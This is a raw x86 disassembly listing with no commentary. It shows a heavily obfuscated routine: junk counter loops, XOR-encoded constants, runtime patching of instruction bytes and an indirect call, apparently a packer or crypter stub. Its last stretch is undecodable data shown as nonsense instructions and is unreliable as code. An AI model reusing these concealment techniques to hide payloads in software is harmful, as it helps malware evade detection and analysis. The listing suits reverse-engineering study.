  40d97f:	call   DWORD PTR ds:0x412278
  40d985:	cmp    DWORD PTR ds:0x4335a7,0x4
  40d98c:	jne    0x40d99f
  40d992:	mov    edi,DWORD PTR ds:0x4335a7
  40d998:	dec    edi
  40d999:	mov    DWORD PTR ds:0x4335a7,edi
  40d99f:	xor    edi,edi
  40d9a1:	add    edi,DWORD PTR ds:0x4335a7
  40d9a7:	dec    edi
  40d9a8:	mov    DWORD PTR ds:0x4335a7,edi
  40d9ae:	jmp    0x40d953
  40d9b3:	xor    ebx,DWORD PTR ds:0x43354f
  40d9b9:	mov    edi,0x32729a
  40d9be:	add    eax,edi
  40d9c0:	mov    DWORD PTR [ecx],eax
  40d9c2:	mov    eax,ds:0x413dda
  40d9c7:	mov    DWORD PTR ds:0x4335db,ecx
  40d9cd:	cmp    eax,0x22c02f45
  40d9d2:	mov    DWORD PTR ds:0x4335f3,ecx
  40d9d8:	mov    eax,DWORD PTR [ebp-0x4]
  40d9db:	mov    ebx,DWORD PTR ds:0x43359f
  40d9e1:	mov    ebx,0xf89c8539
  40d9e6:	je     0x40da18
  40d9ec:	sub    DWORD PTR ds:0x43355f,edx
  40d9f2:	mov    ecx,DWORD PTR [ebp-0x24]
  40d9f5:	xor    eax,esi
  40d9f7:	add    eax,edi
  40d9f9:	imul   eax,ecx
  40d9fc:	mov    DWORD PTR ds:0x433663,0x5372
  40da06:	mov    DWORD PTR [ebp-0x24],eax
  40da09:	mov    DWORD PTR ds:0x4335eb,0x4650
  40da13:	jmp    0x40db46
  40da18:	xor    eax,esi
  40da1a:	movzx  ecx,WORD PTR ds:0x43354f
  40da21:	sub    DWORD PTR ds:0x433567,ecx
  40da27:	add    eax,edi
  40da29:	mov    ds:0x413c2a,eax
  40da2e:	xor    DWORD PTR ds:0x43355b,edi
  40da34:	mov    eax,DWORD PTR [ebp-0x24]
  40da37:	xor    eax,esi
  40da39:	and    DWORD PTR ds:0x43362f,0x0
  40da43:	jmp    0x40da55
  40da48:	mov    ecx,DWORD PTR ds:0x43362f
  40da4e:	inc    ecx
  40da4f:	mov    DWORD PTR ds:0x43362f,ecx
  40da55:	cmp    DWORD PTR ds:0x43362f,0x19
  40da5c:	jae    0x40da9d
  40da62:	cmp    DWORD PTR ds:0x43362f,0xe
  40da69:	jne    0x40da78
  40da6f:	push   DWORD PTR [ebp-0x14]
  40da72:	call   DWORD PTR ds:0x41227c
  40da78:	cmp    DWORD PTR ds:0x43362f,0xd
  40da7f:	jne    0x40da92
  40da85:	mov    ecx,DWORD PTR ds:0x43362f
  40da8b:	inc    ecx
  40da8c:	mov    DWORD PTR ds:0x43362f,ecx
  40da92:	jmp    0x40da48
  40da97:	sbb    DWORD PTR ds:0x43365b,edx
  40da9d:	add    eax,edi
  40da9f:	and    DWORD PTR ds:0x433597,0x0
  40daa9:	jmp    0x40dabd
  40daae:	xor    ecx,ecx
  40dab0:	or     ecx,DWORD PTR ds:0x433597
  40dab6:	inc    ecx
  40dab7:	mov    DWORD PTR ds:0x433597,ecx
  40dabd:	cmp    DWORD PTR ds:0x433597,0x15
  40dac4:	jae    0x40daf7
  40daca:	cmp    DWORD PTR ds:0x433597,0x1c
  40dad1:	jne    0x40daf2
  40dad7:	push   0x1c72
  40dadc:	push   DWORD PTR [ebp-0xc]
  40dadf:	push   DWORD PTR [ebp-0x14]
  40dae2:	push   0x433874
  40dae7:	push   0x400000
  40daec:	call   DWORD PTR ds:0x412280
  40daf2:	jmp    0x40daae
  40daf7:	mov    ds:0x413dda,eax
  40dafc:	mov    eax,DWORD PTR [ebp-0x4]
  40daff:	or     DWORD PTR ds:0x433563,0x6d3e
  40db09:	mov    ecx,DWORD PTR ds:0x413c2a
  40db0f:	adc    DWORD PTR ds:0x4335a7,0x43354f
  40db19:	xor    eax,esi
  40db1b:	adc    DWORD PTR ds:0x433657,0x260d
  40db25:	add    eax,edi
  40db27:	cmp    ecx,eax
  40db29:	mov    DWORD PTR ds:0x433543,0x58a9
  40db33:	jne    0x40db46
  40db39:	push   ebx
  40db3a:	push   DWORD PTR [ebp-0x4]
  40db3d:	push   DWORD PTR [ebp-0x24]
  40db40:	call   DWORD PTR ds:0x413c22
  40db46:	or     DWORD PTR ds:0x433547,0x68cd
  40db50:	mov    eax,ds:0x413b16
  40db55:	mov    ecx,DWORD PTR ds:0x4335cf
  40db5b:	mov    ecx,DWORD PTR [ecx]
  40db5d:	or     DWORD PTR ds:0x433563,ecx
  40db63:	mov    eax,DWORD PTR [eax+0x18c]
  40db69:	and    DWORD PTR ds:0x43361f,0x0
  40db73:	mov    ecx,DWORD PTR ds:0x43361f
  40db79:	inc    ecx
  40db7a:	mov    DWORD PTR ds:0x43361f,ecx
  40db80:	cmp    DWORD PTR ds:0x43361f,0x21
  40db87:	jne    0x40db9d
  40db8d:	push   0x43361f
  40db92:	push   0x4b8b
  40db97:	call   DWORD PTR ds:0x4121a8
  40db9d:	cmp    DWORD PTR ds:0x43361f,0x1b
  40dba4:	jb     0x40db73
  40dbaa:	mov    eax,DWORD PTR [eax]
  40dbac:	sbb    DWORD PTR ds:0x43359f,0x7dd1
  40dbb6:	mov    DWORD PTR [ebp-0x44],eax
  40dbb9:	mov    DWORD PTR ds:0x433627,0x12
  40dbc3:	cmp    DWORD PTR ds:0x433627,0x0
  40dbca:	je     0x40dc20
  40dbd0:	cmp    DWORD PTR ds:0x433627,0x6
  40dbd7:	jne    0x40dbf0
  40dbdd:	push   0x2c3a
  40dbe2:	push   0x433667
  40dbe7:	push   DWORD PTR [ebp-0x20]
  40dbea:	call   DWORD PTR ds:0x4121ac
  40dbf0:	cmp    DWORD PTR ds:0x433627,0x7
  40dbf7:	jne    0x40dc0a
  40dbfd:	mov    ecx,DWORD PTR ds:0x433627
  40dc03:	dec    ecx
  40dc04:	mov    DWORD PTR ds:0x433627,ecx
  40dc0a:	xor    ecx,ecx
  40dc0c:	or     ecx,DWORD PTR ds:0x433627
  40dc12:	dec    ecx
  40dc13:	mov    DWORD PTR ds:0x433627,ecx
  40dc19:	jmp    0x40dbc3
  40dc1e:	xor    edx,eax
  40dc20:	mov    DWORD PTR [ebp-0x10],ebx
  40dc23:	and    DWORD PTR ds:0x433617,0x0
  40dc2d:	xor    eax,eax
  40dc2f:	or     eax,DWORD PTR ds:0x433617
  40dc35:	inc    eax
  40dc36:	mov    ds:0x433617,eax
  40dc3b:	cmp    DWORD PTR ds:0x433617,0x5
  40dc42:	jne    0x40dc5a
  40dc48:	push   0x433775
  40dc4d:	push   0x1
  40dc4f:	push   0x1
  40dc51:	push   DWORD PTR [ebp-0x20]
  40dc54:	call   DWORD PTR ds:0x4121b0
  40dc5a:	cmp    DWORD PTR ds:0x433617,0x4
  40dc61:	jne    0x40dc72
  40dc67:	mov    eax,ds:0x433617
  40dc6c:	inc    eax
  40dc6d:	mov    ds:0x433617,eax
  40dc72:	cmp    DWORD PTR ds:0x433617,0x18
  40dc79:	jb     0x40dc2d
  40dc7f:	and    DWORD PTR ds:0x43354b,ecx
  40dc85:	mov    DWORD PTR [ebp-0x10],ebx
  40dc88:	mov    DWORD PTR [ebp-0x10],ebx
  40dc8b:	sbb    DWORD PTR ds:0x433547,ebx
  40dc91:	mov    DWORD PTR [ebp-0x14],0xf89c8535
  40dc98:	and    DWORD PTR ds:0x433673,0x6700
  40dca2:	mov    DWORD PTR [ebp-0x10],ebx
  40dca5:	and    DWORD PTR ds:0x43359f,0x0
  40dcaf:	jmp    0x40dcc1
  40dcb4:	mov    ecx,DWORD PTR ds:0x43359f
  40dcba:	inc    ecx
  40dcbb:	mov    DWORD PTR ds:0x43359f,ecx
  40dcc1:	cmp    DWORD PTR ds:0x43359f,0x1d
  40dcc8:	jae    0x40dd19
  40dcce:	cmp    DWORD PTR ds:0x43359f,0x7
  40dcd5:	jne    0x40dce4
  40dcdb:	push   DWORD PTR [ebp-0x1c]
  40dcde:	call   DWORD PTR ds:0x4121b4
  40dce4:	cmp    DWORD PTR ds:0x43359f,0x6
  40dceb:	jne    0x40dd00
  40dcf1:	xor    ecx,ecx
  40dcf3:	add    ecx,DWORD PTR ds:0x43359f
  40dcf9:	inc    ecx
  40dcfa:	mov    DWORD PTR ds:0x43359f,ecx
  40dd00:	jmp    0x40dcb4
  40dd05:	xor    edx,edx
  40dd07:	or     edx,DWORD PTR ds:0x4335a7
  40dd0d:	sbb    edx,DWORD PTR ds:0x433667
  40dd13:	mov    DWORD PTR ds:0x4335a7,edx
  40dd19:	mov    DWORD PTR [ebp-0x10],0xf89c853d
  40dd20:	mov    ecx,DWORD PTR ds:0x43366b
  40dd26:	or     DWORD PTR ds:0x43361b,ecx
  40dd2c:	mov    eax,DWORD PTR [ebp-0x24]
  40dd2f:	sbb    edx,ecx
  40dd31:	mov    ecx,DWORD PTR [ebp-0x4]
  40dd34:	mov    edx,DWORD PTR ds:0x4335b3
  40dd3a:	and    DWORD PTR ds:0x43361f,edx
  40dd40:	mov    edx,DWORD PTR [ebp-0x4]
  40dd43:	xor    edx,esi
  40dd45:	xor    ecx,esi
  40dd47:	add    ecx,edx
  40dd49:	mov    edx,DWORD PTR [ebp-0x4]
  40dd4c:	xor    eax,esi
  40dd4e:	xor    edx,esi
  40dd50:	add    eax,edi
  40dd52:	mov    DWORD PTR ds:0x433557,0x7934
  40dd5c:	lea    ecx,[ecx+edx*1+0x9757ce]
  40dd63:	mov    DWORD PTR ds:0x43354f,0x1f1b
  40dd6d:	mov    DWORD PTR [ebp-0x20],eax
  40dd70:	mov    DWORD PTR ds:0x43355b,0xf60
  40dd7a:	cmp    eax,ecx
  40dd7c:	mov    DWORD PTR ds:0x43366b,0x7c7a
  40dd86:	ja     0x40dec6
  40dd8c:	jmp    0x40dd9e
  40dd91:	sbb    DWORD PTR ds:0x43361b,0x74d8
  40dd9b:	mov    eax,DWORD PTR [ebp-0x20]
  40dd9e:	and    DWORD PTR ds:0x43355b,edi
  40dda4:	mov    ecx,DWORD PTR [ebp-0x4]
  40dda7:	or     DWORD PTR ds:0x4335a7,0x43362f
  40ddb1:	xor    ecx,esi
  40ddb3:	adc    DWORD PTR ds:0x43365f,0x2704
  40ddbd:	lea    eax,[ecx+eax*1+0x32729a]
  40ddc4:	and    DWORD PTR ds:0x43359f,0x7330
  40ddce:	push   eax
  40ddcf:	mov    eax,DWORD PTR [ebp-0x14]
  40ddd2:	xor    eax,esi
  40ddd4:	and    DWORD PTR ds:0x43355b,0x43362f
  40ddde:	lea    eax,[ebp+eax*1+0x3272a2]
  40dde5:	push   eax
  40dde6:	mov    eax,ds:0x43354b
  40ddeb:	or     DWORD PTR ds:0x4335df,eax
  40ddf1:	mov    eax,ds:0x413b16
  40ddf6:	push   DWORD PTR [eax+0x1bc]
  40ddfc:	adc    DWORD PTR ds:0x43365b,0x4335b3
  40de06:	call   0x403290
  40de0b:	add    DWORD PTR ds:0x433663,0x32bd
  40de15:	mov    eax,DWORD PTR [ebp-0x4]
  40de18:	mov    ecx,DWORD PTR [ebp-0x20]
  40de1b:	sbb    DWORD PTR ds:0x4335ef,ecx
  40de21:	xor    eax,esi
  40de23:	and    DWORD PTR ds:0x4335ab,0x0
  40de2d:	mov    edx,DWORD PTR ds:0x4335ab
  40de33:	inc    edx
  40de34:	mov    DWORD PTR ds:0x4335ab,edx
  40de3a:	cmp    DWORD PTR ds:0x4335ab,0x23
  40de41:	jne    0x40de57
  40de47:	push   0x303f
  40de4c:	push   0x8a6d
  40de51:	call   DWORD PTR ds:0x4121b8
  40de57:	cmp    DWORD PTR ds:0x4335ab,0x15
  40de5e:	jb     0x40de2d
  40de64:	lea    eax,[ecx+eax*1+0x32729a]
  40de6b:	sbb    DWORD PTR ds:0x433667,0x3009
  40de75:	mov    ecx,DWORD PTR [ebp-0x4]
  40de78:	mov    edx,DWORD PTR [ebp-0x4]
  40de7b:	xor    edx,esi
  40de7d:	add    DWORD PTR ds:0x43361b,0x46c0
  40de87:	xor    ecx,esi
  40de89:	xor    DWORD PTR ds:0x433657,0x4fa5
  40de93:	add    ecx,edx
  40de95:	and    edx,DWORD PTR ds:0x433663
  40de9b:	mov    edx,DWORD PTR [ebp-0x4]
  40de9e:	adc    DWORD PTR ds:0x433597,0x7c2
  40dea8:	xor    edx,esi
  40deaa:	lea    ecx,[ecx+edx*1+0x9757ce]
  40deb1:	mov    DWORD PTR [ebp-0x20],eax
  40deb4:	cmp    eax,ecx
  40deb6:	mov    DWORD PTR ds:0x4335e7,0x1689
  40dec0:	jbe    0x40dd91
  40dec6:	mov    eax,DWORD PTR [ebp+0xc]
  40dec9:	mov    ds:0x41399a,eax
  40dece:	mov    eax,DWORD PTR [ebp+0x10]
  40ded1:	mov    ds:0x413bee,eax
  40ded6:	mov    eax,ds:0x41399a
  40dedb:	mov    ecx,DWORD PTR [ebp-0x18]
  40dede:	push   DWORD PTR [ebp-0x44]
  40dee1:	sub    eax,edi
  40dee3:	push   DWORD PTR [ebp-0x30]
  40dee6:	xor    eax,esi
  40dee8:	mov    DWORD PTR [ecx],eax
  40deea:	push   DWORD PTR [ebp-0x2c]
  40deed:	call   0x40e1d3
  40def2:	sub    eax,edi
  40def4:	xor    eax,esi
  40def6:	mov    DWORD PTR [ebp+0xc],eax
  40def9:	mov    ecx,DWORD PTR [ebp-0x4]
  40defc:	mov    eax,DWORD PTR [ebp+0xc]
  40deff:	xor    ecx,esi
  40df01:	add    ecx,edi
  40df03:	xor    edx,edx
  40df05:	div    ecx
  40df07:	mov    ecx,DWORD PTR [ebp-0x24]
  40df0a:	cmp    ecx,eax
  40df0c:	jne    0x40e135
  40df12:	mov    eax,ds:0x413b16
  40df17:	mov    DWORD PTR [ebp+0x10],eax
  40df1a:	mov    eax,ds:0x413c26
  40df1f:	mov    DWORD PTR [ebp-0x50],eax
  40df22:	mov    DWORD PTR [ebp-0x18],0xf89c8535
  40df29:	mov    DWORD PTR [ebp-0x20],0xf89c8534
  40df30:	mov    DWORD PTR [ebp-0x4c],0xf89cb535
  40df37:	mov    DWORD PTR [ebp-0x64],0xf89f0535
  40df3e:	mov    DWORD PTR [ebp-0x60],0xf89c85f5
  40df45:	mov    DWORD PTR [ebp-0x54],0xf89c85d5
  40df4c:	mov    eax,DWORD PTR [ebp-0x18]
  40df4f:	xor    eax,esi
  40df51:	add    eax,edi
  40df53:	mov    DWORD PTR [ebp-0xc],eax
  40df56:	mov    DWORD PTR [ebp-0x3c],0xf89c8538
  40df5d:	mov    BYTE PTR [ebp-0x25],0x67
  40df61:	mov    eax,DWORD PTR [ebp-0x18]
  40df64:	xor    eax,esi
  40df66:	add    eax,edi
  40df68:	mov    DWORD PTR [ebp-0xc],eax
  40df6b:	mov    eax,DWORD PTR [ebp-0x54]
  40df6e:	xor    eax,esi
  40df70:	add    eax,edi
  40df72:	mov    DWORD PTR [ebp-0x40],eax
  40df75:	mov    eax,DWORD PTR [ebp-0x4c]
  40df78:	xor    eax,esi
  40df7a:	add    eax,edi
  40df7c:	mov    DWORD PTR [ebp-0x38],eax
  40df7f:	mov    eax,DWORD PTR [ebp-0x3c]
  40df82:	xor    eax,esi
  40df84:	add    eax,edi
  40df86:	mov    DWORD PTR [ebp-0x34],eax
  40df89:	lea    eax,[ebp-0xa8]
  40df8f:	mov    DWORD PTR [ebp+0xc],eax
  40df92:	mov    eax,DWORD PTR [ebp-0x18]
  40df95:	mov    DWORD PTR [ebp-0x14],eax
  40df98:	mov    eax,DWORD PTR [ebp-0x20]
  40df9b:	mov    DWORD PTR [ebp-0x5c],ebx
  40df9e:	mov    DWORD PTR [ebp-0x10],eax
  40dfa1:	mov    eax,DWORD PTR [ebp-0x5c]
  40dfa4:	mov    ecx,DWORD PTR [ebp+0xc]
  40dfa7:	xor    eax,esi
  40dfa9:	add    eax,0x32729a
  40dfae:	mov    DWORD PTR [ecx],eax
  40dfb0:	mov    eax,DWORD PTR [ebp-0x14]
  40dfb3:	mov    ecx,DWORD PTR [ebp+0xc]
  40dfb6:	xor    eax,esi
  40dfb8:	add    eax,edi
  40dfba:	mov    DWORD PTR [ecx+0x4],eax
  40dfbd:	mov    eax,DWORD PTR [ebp-0x34]
  40dfc0:	mov    ecx,DWORD PTR [ebp+0xc]
  40dfc3:	mov    DWORD PTR [ecx+0x8],eax
  40dfc6:	mov    eax,DWORD PTR [ebp-0x38]
  40dfc9:	mov    ecx,DWORD PTR [ebp+0xc]
  40dfcc:	mov    DWORD PTR [ecx+0xc],eax
  40dfcf:	mov    eax,DWORD PTR [ebp-0x40]
  40dfd2:	mov    ecx,DWORD PTR [ebp+0xc]
  40dfd5:	mov    DWORD PTR [ecx+0x10],eax
  40dfd8:	mov    eax,eax
  40dfda:	mov    eax,DWORD PTR [ebp-0x10]
  40dfdd:	xor    eax,esi
  40dfdf:	add    eax,edi
  40dfe1:	je     0x40e012
  40dfe7:	lea    eax,[ebp-0xa8]
  40dfed:	push   eax
  40dfee:	mov    eax,DWORD PTR [ebp-0x20]
  40dff1:	xor    eax,esi
  40dff3:	add    eax,edi
  40dff5:	push   eax
  40dff6:	mov    eax,DWORD PTR [ebp+0x10]
  40dff9:	add    eax,0xaa
  40dffe:	push   eax
  40dfff:	mov    eax,DWORD PTR [ebp+0x10]
  40e002:	mov    eax,DWORD PTR [eax+0x198]
  40e008:	push   DWORD PTR [eax]
  40e00a:	call   0x4100b5
  40e00f:	mov    DWORD PTR [ebp-0x8],eax
  40e012:	cmp    DWORD PTR [ebp-0x8],0x0
  40e016:	je     0x40e135
  40e01c:	lea    eax,[ebp-0xc]
  40e01f:	mov    DWORD PTR [ebp-0x38],eax
  40e022:	mov    eax,DWORD PTR [ebp-0x60]
  40e025:	xor    eax,esi
  40e027:	add    eax,edi
  40e029:	mov    DWORD PTR [ebp-0x40],eax
  40e02c:	mov    eax,DWORD PTR [ebp-0x3c]
  40e02f:	xor    eax,esi
  40e031:	add    eax,edi
  40e033:	mov    DWORD PTR [ebp-0x10],eax
  40e036:	mov    eax,DWORD PTR [ebp-0x8]
  40e039:	mov    DWORD PTR [ebp-0x14],eax
  40e03c:	lea    eax,[ebp-0xa8]
  40e042:	mov    DWORD PTR [ebp+0xc],eax
  40e045:	mov    eax,DWORD PTR [ebp-0x18]
  40e048:	mov    DWORD PTR [ebp-0x18],eax
  40e04b:	mov    eax,DWORD PTR [ebp-0x20]
  40e04e:	mov    DWORD PTR [ebp-0x48],ebx
  40e051:	mov    DWORD PTR [ebp-0x34],eax
  40e054:	mov    eax,DWORD PTR [ebp-0x48]
  40e057:	mov    ecx,DWORD PTR [ebp+0xc]
  40e05a:	xor    eax,esi
  40e05c:	add    eax,0x32729a
  40e061:	mov    DWORD PTR [ecx],eax
  40e063:	mov    eax,DWORD PTR [ebp-0x14]
  40e066:	mov    ecx,DWORD PTR [ebp+0xc]
  40e069:	mov    DWORD PTR [ecx+0x4],eax
  40e06c:	mov    eax,DWORD PTR [ebp-0x10]
  40e06f:	mov    ecx,DWORD PTR [ebp+0xc]
  40e072:	mov    DWORD PTR [ecx+0x8],eax
  40e075:	mov    eax,DWORD PTR [ebp-0x40]
  40e078:	mov    ecx,DWORD PTR [ebp+0xc]
  40e07b:	mov    DWORD PTR [ecx+0xc],eax
  40e07e:	mov    eax,DWORD PTR [ebp-0x38]
  40e081:	mov    ecx,DWORD PTR [ebp+0xc]
  40e084:	mov    DWORD PTR [ecx+0x10],eax
  40e087:	mov    eax,eax
  40e089:	mov    eax,DWORD PTR [ebp-0x14]
  40e08c:	test   eax,eax
  40e08e:	mov    eax,DWORD PTR [ebp-0x34]
  40e091:	jne    0x40e09a
  40e097:	mov    eax,DWORD PTR [ebp-0x18]
  40e09a:	xor    eax,esi
  40e09c:	add    eax,edi
  40e09e:	test   eax,eax
  40e0a0:	je     0x40e0ce
  40e0a6:	lea    eax,[ebp-0xa8]
  40e0ac:	push   eax
  40e0ad:	mov    eax,DWORD PTR [ebp-0x20]
  40e0b0:	xor    eax,esi
  40e0b2:	add    eax,edi
  40e0b4:	push   eax
  40e0b5:	mov    eax,DWORD PTR [ebp+0x10]
  40e0b8:	add    eax,0xee
  40e0bd:	push   eax
  40e0be:	mov    eax,DWORD PTR [ebp+0x10]
  40e0c1:	mov    eax,DWORD PTR [eax+0x198]
  40e0c7:	push   DWORD PTR [eax]
  40e0c9:	call   0x4100b5
  40e0ce:	mov    ecx,DWORD PTR [ebp-0x3c]
  40e0d1:	xor    ecx,esi
  40e0d3:	mov    eax,0xffcd8d66
  40e0d8:	sub    eax,ecx
  40e0da:	sub    eax,DWORD PTR [ebp-0x8]
  40e0dd:	mov    ecx,DWORD PTR [ebp-0x50]
  40e0e0:	add    ecx,eax
  40e0e2:	mov    eax,DWORD PTR [ebp-0x8]
  40e0e5:	mov    DWORD PTR [eax+0x1],ecx
  40e0e8:	mov    al,BYTE PTR [ebp-0x25]
  40e0eb:	mov    ecx,DWORD PTR [ebp-0x8]
  40e0ee:	xor    al,0x45
  40e0f0:	sub    al,0x39
  40e0f2:	mov    BYTE PTR [ecx],al
  40e0f4:	lea    eax,[ebp-0x8]
  40e0f7:	inc    BYTE PTR [eax]
  40e0f9:	inc    eax
  40e0fa:	push   eax
  40e0fb:	pop    ecx
  40e0fc:	dec    ecx
  40e0fd:	xchg   ecx,edx
  40e0ff:	dec    BYTE PTR [edx]
  40e101:	push   DWORD PTR [ebp+0x10]
  40e104:	mov    eax,ds:0x413bd2
  40e109:	mov    eax,DWORD PTR [eax]
  40e10b:	push   DWORD PTR [eax]
  40e10d:	lea    eax,ds:0x413bee
  40e113:	push   DWORD PTR [eax]
  40e115:	lea    eax,ds:0x41399a
  40e11b:	push   DWORD PTR [eax]
  40e11d:	lea    eax,ds:0x413bce
  40e123:	push   DWORD PTR [eax]
  40e125:	lea    eax,ds:0x413d06
  40e12b:	push   DWORD PTR [eax]
  40e12d:	xchg   ebx,edx
  40e12f:	inc    ebx
  40e130:	push   ebx
  40e131:	pop    eax
  40e132:	call   DWORD PTR [eax-0x1]
  40e135:	lea    eax,[ebp+0x4]
  40e138:	mov    DWORD PTR [ebp-0x58],eax
  40e13b:	mov    eax,ds:0x413b16
  40e140:	push   0x4
  40e142:	add    eax,0x1cc
  40e147:	push   eax
  40e148:	lea    eax,[ebp-0x1c]
  40e14b:	push   eax
  40e14c:	call   0x403290
  40e151:	mov    eax,DWORD PTR [ebp-0x1c]
  40e154:	mov    eax,DWORD PTR [ebp-0x4]
  40e157:	mov    eax,DWORD PTR [ebp-0x24]
  40e15a:	mov    DWORD PTR [ebp+0xc],eax
  40e15d:	mov    eax,ds:0x413b9a
  40e162:	mov    ecx,DWORD PTR [ebp+0xc]
  40e165:	sub    eax,edi
  40e167:	xor    eax,esi
  40e169:	cmp    eax,ecx
  40e16b:	je     0x40e1b2
  40e171:	mov    eax,ds:0x413b92
  40e176:	mov    ecx,DWORD PTR [ebp+0xc]
  40e179:	sub    eax,edi
  40e17b:	xor    eax,esi
  40e17d:	cmp    eax,ecx
  40e17f:	jne    0x40e195
  40e185:	mov    eax,ds:0x413b9a
  40e18a:	add    eax,DWORD PTR ds:0x413b92
  40e190:	jmp    0x40e19c
  40e195:	mov    eax,DWORD PTR [ebp+0xc]
  40e198:	xor    eax,esi
  40e19a:	add    eax,edi
  40e19c:	mov    ds:0x413b92,eax
  40e1a1:	mov    eax,DWORD PTR [ebp+0xc]
  40e1a4:	xor    eax,esi
  40e1a6:	add    eax,edi
  40e1a8:	mov    ds:0x413b9a,eax
  40e1ad:	jmp    0x40e1bc
  40e1b2:	mov    eax,ds:0x413b9a
  40e1b7:	mov    ds:0x413b92,eax
  40e1bc:	mov    eax,DWORD PTR [ebp-0x58]
  40e1bf:	mov    ecx,DWORD PTR ds:0x413b92
  40e1c5:	add    DWORD PTR [eax],ecx
  40e1c7:	mov    eax,DWORD PTR [ebp-0x1c]
  40e1ca:	mov    eax,DWORD PTR [eax]
  40e1cc:	pop    edi
  40e1cd:	pop    esi
  40e1ce:	pop    ebx
  40e1cf:	leave  
  40e1d0:	ret    0xc
  40e1d3:	push   ebp
  40e1d4:	mov    ebp,esp
  40e1d6:	push   ecx
  40e1d7:	push   ecx
  40e1d8:	mov    DWORD PTR ds:0x433557,0x1ded
  40e1e2:	mov    eax,0xf89c8534
  40e1e7:	mov    ecx,DWORD PTR ds:0x4335df
  40e1ed:	mov    DWORD PTR [ebp-0x4],0xf89c8535
  40e1f4:	push   esi
  40e1f5:	mov    esi,0x7be1
  40e1fa:	mov    DWORD PTR [ebp-0x8],eax
  40e1fd:	mov    ecx,DWORD PTR [ebp+0x8]
  40e200:	push   edi
  40e201:	mov    DWORD PTR ds:0x43362b,0x40de
  40e20b:	mov    edi,0x7510853
  40e210:	mov    esi,DWORD PTR ds:0x4335af
  40e216:	mov    esi,0x32729a
  40e21b:	cmp    ecx,eax
  40e21d:	mov    DWORD PTR ds:0x433617,0x680f
  40e227:	je     0x40eaa5
  40e22d:	and    DWORD PTR ds:0x433627,0x0
  40e237:	mov    ecx,DWORD PTR ds:0x433627
  40e23d:	inc    ecx
  40e23e:	mov    DWORD PTR ds:0x433627,ecx
  40e244:	cmp    DWORD PTR ds:0x433627,0xa
  40e24b:	jne    0x40e25f
  40e251:	push   0x15e8
  40e256:	push   DWORD PTR [ebp-0x10]
  40e259:	call   DWORD PTR ds:0x4120d0
  40e25f:	cmp    DWORD PTR ds:0x433627,0x9
  40e266:	jne    0x40e279
  40e26c:	mov    ecx,DWORD PTR ds:0x433627
  40e272:	inc    ecx
  40e273:	mov    DWORD PTR ds:0x433627,ecx
  40e279:	cmp    DWORD PTR ds:0x433627,0x14
  40e280:	jb     0x40e237
  40e286:	or     ecx,eax
  40e288:	mov    eax,DWORD PTR [ebp-0x4]
  40e28b:	mov    ecx,DWORD PTR [ebp+0xc]
  40e28e:	sbb    DWORD PTR ds:0x43365b,0x433547
  40e298:	xor    eax,edi
  40e29a:	add    eax,esi
  40e29c:	cmp    eax,ecx
  40e29e:	je     0x40eaa5
  40e2a4:	and    eax,0x1e6e
  40e2a9:	mov    eax,DWORD PTR [ebp-0x4]
  40e2ac:	and    DWORD PTR ds:0x4335eb,0x0
  40e2b6:	mov    edx,DWORD PTR ds:0x4335eb
  40e2bc:	inc    edx
  40e2bd:	mov    DWORD PTR ds:0x4335eb,edx
  40e2c3:	cmp    DWORD PTR ds:0x4335eb,0x20
  40e2ca:	jne    0x40e2e0
  40e2d0:	push   0x433874
  40e2d5:	push   0x433874
  40e2da:	call   DWORD PTR ds:0x4121bc
  40e2e0:	cmp    DWORD PTR ds:0x4335eb,0x1f
  40e2e7:	jb     0x40e2b6
  40e2ed:	xor    eax,edi
  40e2ef:	add    eax,esi
  40e2f1:	push   eax
  40e2f2:	push   DWORD PTR [ebp-0x8]
  40e2f5:	push   DWORD PTR [ebp-0x4]
  40e2f8:	mov    edx,DWORD PTR ds:0x413b16
  40e2fe:	call   0x40f9cd
  40e303:	mov    ecx,DWORD PTR ds:0x413b16
  40e309:	mov    ecx,DWORD PTR [ecx+0x1cc]
  40e30f:	jmp    0x40e6d5
  40e314:	cmp    BYTE PTR [ebp*1+0x6055fdb9],dh
  40e31b:	mov    ebp,0x9445ce55
  40e320:	push   eax
  40e321:	loope  0x40e2fc
  40e323:	add    eax,0x7c7ca4c5
  40e328:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e329:	jns    0x40e3a7
  40e32b:	jl     0x40e2fd
  40e32d:	lea    edx,[esi-0xc69cc06]
  40e333:	(bad)  
  40e334:	mov    WORD PTR [eax-0x3a],fs
  40e337:	in     eax,dx
  40e338:	jno    0x40e2d4
  40e33a:	dec    ebx
  40e33b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e33c:	imul   edi,DWORD PTR [eax+eiz*2],0x72242ac9
  40e343:	(bad)  
  40e344:	cmp    ecx,DWORD PTR [edx-0x3b]
  40e347:	les    edi,FWORD PTR [eax]
  40e349:	test   eax,0x7b46725
  40e34e:	or     DWORD PTR [edx+0x2a],eax
  40e351:	(bad)  
  40e353:	arpl   WORD PTR [esi+0x3d],di
  40e356:	push   cs
  40e357:	loop   0x40e3a1
  40e359:	add    ch,BYTE PTR [edi+0x71d45677]
  40e35f:	dec    eax
  40e360:	cmp    eax,DWORD PTR [edi+0x24f94195]
  40e366:	cdq    
  40e367:	(bad)  
  40e368:	mov    edx,0x6d9f4408
  40e36d:	mov    ds:0xac907a9d,eax
  40e372:	je     0x40e3dc
  40e374:	mov    esi,0xdd3bd7e1
  40e379:	xchg   edi,eax
  40e37a:	pop    ebx
  40e37b:	rcl    BYTE PTR [ebp+esi*1-0x5f],cl
  40e37f:	and    dh,BYTE PTR [esi+0x7e]
  40e382:	mov    edx,0xacd23542
  40e387:	fucomp st(6)
  40e389:	lahf   
  40e38a:	(bad)  
  40e38b:	mov    eax,0xd2cc565e
  40e390:	nop
  40e391:	xchg   edx,eax
  40e392:	mov    ds:0x2ccc9bd1,eax
  40e397:	jecxz  0x40e349
  40e399:	scas   al,BYTE PTR es:[edi]
  40e39a:	sub    BYTE PTR [edx+0x26ac1288],ch
  40e3a0:	xlat   BYTE PTR ds:[ebx]
  40e3a1:	rcl    BYTE PTR [ecx],1
  40e3a3:	add    BYTE PTR [ebx-0xb478614],bl
  40e3a9:	(bad)  
  40e3aa:	out    0xd3,al
  40e3ac:	adc    DWORD PTR [ebp+ecx*8+0x419a549c],esi
  40e3b3:	out    0x18,al
  40e3b5:	shr    DWORD PTR [ecx+0x6f],1
  40e3b8:	mov    eax,0x9d128d03
  40e3bd:	and    DWORD PTR [edi-0x2d],ecx
  40e3c0:	xchg   edi,eax
  40e3c1:	and    DWORD PTR [ebp-0xcac575],0xffffffec
  40e3c8:	mov    ds:0x45296ca,al
